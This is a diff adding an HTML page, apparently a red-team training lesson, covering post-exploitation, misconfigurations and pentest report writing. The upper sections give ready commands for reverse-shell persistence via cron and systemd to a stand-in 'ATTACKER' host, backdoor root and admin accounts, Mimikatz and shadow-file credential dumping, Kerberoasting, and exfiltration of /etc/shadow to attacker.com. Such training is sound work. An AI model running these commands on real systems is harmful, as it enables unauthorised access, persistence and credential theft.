+      <span class="code-tag tag-lin">LINUX</span>
+    </div>
+    <pre><span class="c"># 1. Add SSH authorized key</span>
+<span class="w">echo</span> "ssh-rsa AAAA...yourpubkey..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+<span class="c"># 2. Cron job (reverse shell every minute)</span>
+(crontab -l 2>/dev/null; <span class="w">echo</span> <span class="s">"* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1"</span>) | crontab -
+
+<span class="c"># 3. Backdoor /etc/passwd (add root user)</span>
+<span class="w">echo</span> <span class="s">'backdoor:$1$salt$hashedpassword:0:0:root:/root:/bin/bash'</span> >> /etc/passwd
+
+<span class="c"># 4. Systemd service</span>
+<span class="w">cat</span> > /etc/systemd/system/update.service << EOF
+[Service]
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
+[Install]
+WantedBy=multi-user.target
+EOF
+<span class="w">systemctl enable update.service</span></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Windows Persistence Techniques</span>
+      <span class="code-tag tag-win">WINDOWS</span>
+    </div>
+    <pre><span class="c"># 1. Registry Run Key</span>
+<span class="w">reg add</span> HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
+  /v Update /t REG_SZ /d "C:\Users\Public\backdoor.exe"
+
+<span class="c"># 2. Scheduled Task</span>
+<span class="w">schtasks /create</span> /tn "WindowsUpdate" /tr "C:\Temp\shell.exe" \
+  /sc onlogon /ru SYSTEM
+
+<span class="c"># 3. Create new local admin</span>
+<span class="w">net user</span> backdoor P@ssw0rd /add
+<span class="w">net localgroup administrators</span> backdoor /add</pre>
+  </div>
+
+  <h3 id="cred-dump">🗝️ Credential Dumping</h3>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Extracting credentials — Windows</span>
+      <span class="code-tag tag-win">WINDOWS</span>
+    </div>
+    <pre><span class="c"># Mimikatz — dump all plaintext + hashes from LSASS</span>
+<span class="w">mimikatz</span>
+privilege::debug
+sekurlsa::logonpasswords   <span class="c"># plaintext passwords (if WDigest enabled)</span>
+sekurlsa::wdigest          <span class="c"># force WDigest creds</span>
+lsadump::sam               <span class="c"># SAM database hashes</span>
+lsadump::dcsync /user:Administrator   <span class="c"># DCSync attack (from any domain user)</span>
+
+<span class="c"># Dump LSASS remotely (Impacket)</span>
+<span class="w">impacket-secretsdump</span> domain/user:pass@192.168.1.10
+
+<span class="c"># From memory dump</span>
+<span class="w">pypykatz lsa minidump</span> lsass.dmp</pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Credential harvesting — Linux</span>
+      <span class="code-tag tag-lin">LINUX</span>
+    </div>
+    <pre><span class="c"># /etc/shadow — crack with John / hashcat</span>
+<span class="w">cat /etc/shadow</span>
+<span class="w">john</span> --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+
+<span class="c"># SSH private keys</span>
+<span class="w">find / -name</span> "id_rsa" 2>/dev/null
+
+<span class="c"># Check bash history, config files</span>
+<span class="w">cat ~/.bash_history</span>
+<span class="w">grep -r</span> "password\|passwd\|secret" /var/www/ 2>/dev/null
+
+<span class="c"># Databases</span>
+<span class="w">cat /var/www/html/config.php</span>   <span class="c"># often has DB creds</span></pre>
+  </div>
+
+  <h3 id="c2">📡 C2 Frameworks</h3>
+  <p>A Command and Control (C2) framework lets you manage multiple compromised hosts, pivot through them, and run post-ex modules from one interface.</p>
+
+  <table class="technique-table">
+    <tr>
+      <th>Framework</th>
+      <th>Type</th>
+      <th>Protocol</th>
+      <th>Notes</th>
+    </tr>
+    <tr>
+      <td><strong>Metasploit</strong></td>
+      <td>Open source</td>
+      <td>TCP/HTTP/HTTPS</td>
+      <td>Industry standard; Meterpreter agent; tons of modules</td>
+    </tr>
+    <tr>
+      <td><strong>Cobalt Strike</strong></td>
+      <td>Commercial</td>
+      <td>HTTP/DNS/SMB</td>
+      <td>Industry gold standard; Beacon agent; teamserver for red teams</td>
+    </tr>
+    <tr>
+      <td><strong>Sliver</strong></td>
+      <td>Open source</td>
+      <td>mTLS/WireGuard/DNS</td>
+      <td>Modern CS alternative; multi-platform; implants in Go</td>
+    </tr>
+    <tr>
+      <td><strong>Havoc</strong></td>
+      <td>Open source</td>
+      <td>HTTP/HTTPS</td>
+      <td>Modern, clean UI; Demon agent; good evasion</td>
+    </tr>
+    <tr>
+      <td><strong>Empire</strong></td>
+      <td>Open source</td>
+      <td>HTTP/HTTPS</td>
+      <td>PowerShell/Python based; post-ex heavy</td>
+    </tr>
+  </table>
+
+  <h3 id="exfil">📤 Data Exfiltration</h3>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Exfiltration techniques</span>
+      <span class="code-tag tag-lin">LINUX / WINDOWS</span>
+    </div>
+    <pre><span class="c"># HTTP exfil (simple)</span>
+<span class="w">curl</span> -F "file=@/etc/shadow" http://attacker.com/upload
+
+<span class="c"># DNS exfil (stealthy, bypasses firewalls)</span>
+<span class="w">cat /etc/passwd | xxd -p | while read line; do</span>
+  nslookup $line.attacker.com
+<span class="w">done</span>
+
+<span class="c"># Encode + send over ICMP (ultra stealthy)</span>
+<span class="w">ping</span> -p $(xxd -p /etc/shadow | head -1) attacker.com
+
+<span class="c"># Windows: Certutil base64 encode for transfer</span>
+<span class="w">certutil -encode</span> C:\sensitive.txt C:\encoded.txt</pre>
+  </div>
+</section>
+
+<!-- ==================== SECTION 4: MISCONFIGURATIONS ==================== -->
+<section class="section" id="misconfig">
+  <div class="section-header">
+    <span class="section-number">04</span>
+    <h2 class="section-title red">MISCONFIGURATIONS</h2>
+    <span class="section-badge badge-offensive">EXPLOIT</span>
+  </div>
+
+  <p>Most real-world breaches don't exploit 0-days — they exploit <strong>misconfigurations</strong>. Systems installed with defaults, open shares, weak permissions, and exposed services are far more common than unpatched CVEs.</p>
+
+  <div class="alert alert-warn">
+    <strong>Real World Stat:</strong> Misconfigurations account for ~80% of security incidents according to multiple industry reports. This is Blue Team's biggest win opportunity — fix configs before attackers exploit them.
+  </div>
+
+  <h3 id="smb-misconfig">📁 SMB / NFS Misconfigurations</h3>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">SMB Enumeration & Exploitation</span>
+      <span class="code-tag tag-win">WINDOWS/LINUX</span>
+    </div>
+    <pre><span class="c"># Enumerate SMB shares (null session)</span>
+<span class="w">smbclient -L</span> //192.168.1.10 -N          <span class="c"># anonymous</span>
+<span class="w">crackmapexec smb</span> 192.168.1.10 --shares  <span class="c"># with creds</span>
+
+<span class="c"># Connect to share</span>
+<span class="w">smbclient</span> //192.168.1.10/SHARE -N
+
+<span class="c"># NFS misconfig — list exports</span>
+<span class="w">showmount -e</span> 192.168.1.10
+
+<span class="c"># Mount exposed NFS share</span>
+<span class="w">mount -t nfs</span> 192.168.1.10:/home /tmp/nfs
+
+<span class="c"># If no_root_squash is set: you can write as root</span>
+<span class="c"># Create SUID binary on the share → execute it on victim</span></pre>
+  </div>
+
+  <h3 id="ad-misconfig">🏰 Active Directory Misconfigurations</h3>
+
+  <table class="technique-table">
+    <tr>
+      <th>Misconfiguration</th>
+      <th>Attack</th>
+      <th>MITRE</th>
+    </tr>
+    <tr>
+      <td>Kerberoastable accounts (SPN set on user)</td>
+      <td>Request TGS ticket → offline crack with hashcat</td>
+      <td><span class="mitre-tag">T1558.003</span></td>
+    </tr>
+    <tr>
+      <td>AS-REP Roasting (no pre-auth required)</td>
+      <td>Request AS-REP without auth → crack hash offline</td>
+      <td><span class="mitre-tag">T1558.004</span></td>
+    </tr>
+    <tr>
+      <td>Unconstrained delegation</td>
+      <td>TGTs of any user sent to delegate host → reuse</td>
+      <td><span class="mitre-tag">T1550.003</span></td>
+    </tr>
+    <tr>
+      <td>GenericWrite/GenericAll ACL</td>
+      <td>Modify target user's SPN or reset password → escalate</td>
+      <td><span class="mitre-tag">T1484</span></td>
+    </tr>
+    <tr>
+      <td>Password in description/SYSVOL</td>
+      <td>Read AD attributes / GPP passwords</td>
+      <td><span class="mitre-tag">T1552.006</span></td>
+    </tr>
+  </table>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Kerberoasting</span>
+      <span class="code-tag tag-win">ACTIVE DIRECTORY</span>
+    </div>
+    <pre><span class="c"># Request TGS tickets for SPN accounts</span>
+<span class="w">impacket-GetUserSPNs</span> domain.local/user:pass -dc-ip 192.168.1.1 -request
+
+<span class="c"># Crack with hashcat</span>
+<span class="w">hashcat -m 13100</span> hashes.txt /usr/share/wordlists/rockyou.txt
+
+<span class="c"># AS-REP Roasting (no password needed)</span>
+<span class="w">impacket-GetNPUsers</span> domain.local/ -dc-ip 192.168.1.1 \
+  -usersfile users.txt -format hashcat -outputfile asrep.txt
+<span class="w">hashcat -m 18200</span> asrep.txt rockyou.txt</pre>
+  </div>
+
+  <h3 id="web-misconfig">🌐 Web & API Misconfigurations</h3>
+
+  <table class="technique-table">
+    <tr>
+      <th>Misconfiguration</th>
+      <th>Impact</th>
+      <th>Detection</th>
+    </tr>
+    <tr>
+      <td>Default credentials (admin:admin)</td>
+      <td>Full auth bypass</td>
+      <td>Try rockyou top 100 + default cred lists</td>
+    </tr>
+    <tr>
+      <td>Directory listing enabled</td>
+      <td>Source code / config disclosure</td>
+      <td>GET /backup/ → shows files</td>
+    </tr>
+    <tr>
+      <td>CORS: Access-Control-Allow-Origin: *</td>
+      <td>API data stolen from any origin</td>
+      <td>Check response headers</td>
+    </tr>
+    <tr>
+      <td>Exposed .git / .env</td>
+      <td>Source code + secrets disclosure</td>
+      <td>curl /.git/config, /.env</td>
+    </tr>
+    <tr>
+      <td>phpinfo() / debug mode</td>
+      <td>Server info, path disclosure</td>
+      <td>GET /phpinfo.php</td>
+    </tr>
+    <tr>
+      <td>S3 bucket public read/write</td>
+      <td>Data exfil / content injection</td>
+      <td>aws s3 ls s3://bucketname --no-sign-request</td>
+    </tr>
+    <tr>
+      <td>SSRF + metadata endpoint</td>
+      <td>Cloud credentials via 169.254.169.254</td>
+      <td>Fetch internal URLs via user-controlled input</td>
+    </tr>
+  </table>
+</section>
+
+<!-- ==================== SECTION 5: REPORT WRITING ==================== -->
+<section class="section" id="reporting">
+  <div class="section-header">
+    <span class="section-number">05</span>
+    <h2 class="section-title purple">REPORT WRITING</h2>
+    <span class="section-badge" style="color:#bc8cff;border:1px solid rgba(188,140,255,0.4)">PROFESSIONAL</span>
+  </div>
+
+  <p>A pentest without a report is just hacking. The report is the deliverable — it's what the client pays for. From today onwards, every challenge gets a professional write-up.</p>
+
+  <div class="alert alert-success">
+    <strong>Key Principle:</strong> Write for two audiences. The executive summary is for the CEO who doesn't know what SSH is. The technical findings are for the sysadmin who will actually fix things. Both need to understand the risk.
+  </div>
+
+  <h3 id="finding-format">📋 Professional Report Structure</h3>
+
+  <div class="report-template">
+    <div class="report-section-title" onclick="toggle(this)">
+      <span style="color:var(--accent2)">01</span>&nbsp;&nbsp;Cover Page & Metadata
+      <span class="toggle-icon">▼</span>
+    </div>
+    <div class="report-section-body open">
+      <ul>
+        <li><strong>Title:</strong> Penetration Test Report — [Target / Engagement Name]</li>
+        <li><strong>Date:</strong> Assessment period (start → end)</li>
+        <li><strong>Prepared by:</strong> Tester name, organization</li>
+        <li><strong>Classification:</strong> CONFIDENTIAL — For Authorized Eyes Only</li>
+        <li><strong>Version:</strong> v1.0 (track changes across drafts)</li>
+      </ul>
+    </div>
+
+    <div class="report-section-title" onclick="toggle(this)">
+      <span style="color:var(--accent2)">02</span>&nbsp;&nbsp;Executive Summary
+      <span class="toggle-icon">▼</span>
+    </div>
+    <div class="report-section-body">
+      <p>Written for <strong>non-technical stakeholders</strong>. 1–2 pages max.</p>
+      <ul>
+        <li><strong>Scope:</strong> What was tested and what was out of scope</li>
+        <li><strong>Objective:</strong> What the test aimed to accomplish</li>
+        <li><strong>Overall Risk Rating:</strong> Critical / High / Medium / Low</li>
+        <li><strong>Key Findings Summary:</strong> "3 Critical, 5 High, 8 Medium findings were identified"</li>
+        <li><strong>Narrative:</strong> What an attacker could realistically do (plain English)</li>
+        <li><strong>Top Recommendations:</strong> 3–5 highest priority fixes</li>
+      </ul>
+    </div>
+
+    <div class="report-section-title" onclick="toggle(this)">
+      <span style="color:var(--accent2)">03</span>&nbsp;&nbsp;Methodology
+      <span class="toggle-icon">▼</span>
+    </div>
+    <div class="report-section-body">
+      <ul>
+        <li>Framework used: PTES, OWASP, MITRE ATT&CK</li>
+        <li>Phases: Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting</li>
+        <li>Tools used (list them)</li>
+        <li>Testing type: Black box / Gray box / White box</li>
+        <li>Timeline of key activities</li>
+      </ul>
+    </div>
+
+    <div class="report-section-title" onclick="toggle(this)">
+      <span style="color:var(--accent2)">04</span>&nbsp;&nbsp;Technical Findings (Per Vulnerability)
+      <span class="toggle-icon">▼</span>
+    </div>
+    <div class="report-section-body">
+      <p>Each finding gets its own structured entry:</p>
+      <table class="technique-table" style="margin-top:8px">
+        <tr><th>Field</th><th>Description</th></tr>
+        <tr><td><strong>Finding ID</strong></td><td>VULN-001, VULN-002...</td></tr>
+        <tr><td><strong>Title</strong></td><td>Short descriptive name (e.g., "Unauthenticated RCE via Log4Shell")</td></tr>
+        <tr><td><strong>Severity</strong></td><td><span class="sev sev-crit">CRITICAL</span> <span class="sev sev-high">HIGH</span> <span class="sev sev-med">MEDIUM</span> <span class="sev sev-low">LOW</span> <span class="sev sev-info">INFO</span></td></tr>
+        <tr><td><strong>CVSS Score</strong></td><td>e.g., 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</td></tr>
+        <tr><td><strong>Affected Asset</strong></td><td>IP, hostname, URL, component</td></tr>
+        <tr><td><strong>Description</strong></td><td>What the vulnerability is and why it exists</td></tr>
+        <tr><td><strong>Impact</strong></td><td>What an attacker can do with this (business impact)</td></tr>
+        <tr><td><strong>Proof of Concept</strong></td><td>Step-by-step reproduction with screenshots</td></tr>
+        <tr><td><strong>Remediation</strong></td><td>Specific, actionable fix (not just "patch the server")</td></tr>
+        <tr><td><strong>References</strong></td><td>CVE numbers, CWE, vendor advisories</td></tr>
+      </table>
+    </div>
+
+    <div class="report-section-title" onclick="toggle(this)">
+      <span style="color:var(--accent2)">05</span>&nbsp;&nbsp;Appendices
+      <span class="toggle-icon">▼</span>
+    </div>
+    <div class="report-section-body">
+      <ul>
+        <li>Full command outputs / raw scan results</li>
+        <li>Tool configurations</li>
+        <li>Network diagrams</li>
+        <li>Attack chain visualization</li>
+        <li>Remediation tracker (table of all findings + status)</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 id="cvss">📊 CVSS Scoring Basics</h3>
+  <p>CVSS v3.1 gives a numeric score to a vulnerability. Learn to calculate it — you'll use it in every report.</p>
+
+  <table class="technique-table">
+    <tr>
+      <th>Metric</th>
+      <th>Options</th>
+      <th>What it measures</th>
+    </tr>
+    <tr>
+      <td><strong>Attack Vector (AV)</strong></td>
+      <td>Network / Adjacent / Local / Physical</td>
+      <td>How remote the attacker can be</td>
+    </tr>
+    <tr>
+      <td><strong>Attack Complexity (AC)</strong></td>
+      <td>Low / High</td>
+      <td>How hard is the attack to pull off?</td>
+    </tr>
+    <tr>
+      <td><strong>Privileges Required (PR)</strong></td>
+      <td>None / Low / High</td>
+      <td>What auth does the attacker need?</td>
+    </tr>
+    <tr>
+      <td><strong>User Interaction (UI)</strong></td>
+      <td>None / Required</td>
+      <td>Does the victim need to click something?</td>
+    </tr>
+    <tr>
+      <td><strong>Confidentiality (C)</strong></td>
+      <td>None / Low / High</td>
+      <td>Data disclosure impact</td>
+    </tr>
+    <tr>
+      <td><strong>Integrity (I)</strong></td>
+      <td>None / Low / High</td>
+      <td>Data modification impact</td>
+    </tr>
+    <tr>
+      <td><strong>Availability (A)</strong></td>
+      <td>None / Low / High</td>
+      <td>Service disruption impact</td>
+    </tr>
+  </table>
+
+  <div class="alert alert-info">
+    <strong>Score Ranges:</strong> 0.0 = None · 0.1–3.9 = Low · 4.0–6.9 = Medium · 7.0–8.9 = High · 9.0–10.0 = Critical
+  </div>
+
+  <h3 id="ctf-report">🚩 CTF Write-up Format (Starting Today)</h3>
+  <p>For every challenge from today forward, write a report using this format:</p>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">CTF Challenge Write-up Template</span>
+      <span class="code-tag tag-cmd">MARKDOWN</span>
+    </div>
+    <pre><span class="c"># Challenge: [Challenge Name]</span>
+<span class="w">**Category:**</span> Web / RE / Forensics / Crypto / Pwn
+<span class="w">**Difficulty:**</span> Easy / Medium / Hard
+<span class="w">**Points:**</span> 100
+<span class="w">**Date:**</span> YYYY-MM-DD
+
+<span class="c">---</span>
+
+<span class="c">## 1. Reconnaissance / Initial Analysis</span>
+What you saw first. What tools you ran. What stood out.
+
+<span class="c">## 2. Vulnerability / Weakness Identified</span>
+What the actual vulnerability is. Be specific.
+Link to CVE / CWE / technique if applicable.
+
+<span class="c">## 3. Exploitation</span>
+<span class="c">### Step 1 — [action]</span>
+Command you ran:
+```
+tool args
+```
+Output / screenshot: [describe what you saw]
+
+<span class="c">### Step 2 — [action]</span>
+...
+
+<span class="c">## 4. Proof of Exploitation</span>
+Screenshot or output showing you got the flag / root / objective.
+Flag: `FLAG{...}` (redacted in public write-ups if contest ongoing)
+
+<span class="c">## 5. Lessons Learned</span>
+What did this teach you? What would you do differently?
+What's the real-world equivalent of this vulnerability?
+
+<span class="c">## 6. Remediation (for vuln-style challenges)</span>
+How would a developer/admin fix this?</pre>
+  </div>
+
+  <div class="alert alert-success">
+    <strong>Why this matters:</strong> Every CTF write-up is a portfolio piece. Write them like you're explaining it to a hiring manager at a SOC or red team, because one day you might be.
+  </div>
+</section>
+
+</main>
+</div>
+
+<footer>
+  <span>INSA Cyber Talent — Red Team Track — Day 22</span>
+  <span>Lateral Movement · PrivEsc · Post-Exploitation · Misconfigs · Reporting</span>
+  <span>MITRE ATT&CK Framework Reference</span>
+</footer>
+
+<script>
+  function toggle(el) {
+    const body = el.nextElementSibling;
+    const icon = el.querySelector('.toggle-icon');
+    body.classList.toggle('open');
+    icon.textContent = body.classList.contains('open') ? '▼' : '▶';
+  }
+
+  function scrollTo(id) {
+    document.getElementById(id)?.scrollIntoView({ behavior: 'smooth' });
+  }
+
+  // Active sidebar link on scroll
+  const sections = document.querySelectorAll('.section');
+  const links = document.querySelectorAll('.aside-link');
+
+  window.addEventListener('scroll', () => {
+    let current = '';
+    sections.forEach(s => {
+      if (window.scrollY >= s.offsetTop - 100) current = s.id;
+    });
+    links.forEach(l => {
+      l.classList.remove('active');
+      if (l.getAttribute('onclick')?.includes(`'${current}'`)) l.classList.add('active');
+    });
+
+    // Nav links
+    document.querySelectorAll('nav a').forEach(a => {
+      a.classList.remove('active');
+      if (a.getAttribute('href') === `#${current}`) a.classList.add('active');
+    });
+  });
+</script>
+</body>
+</html>
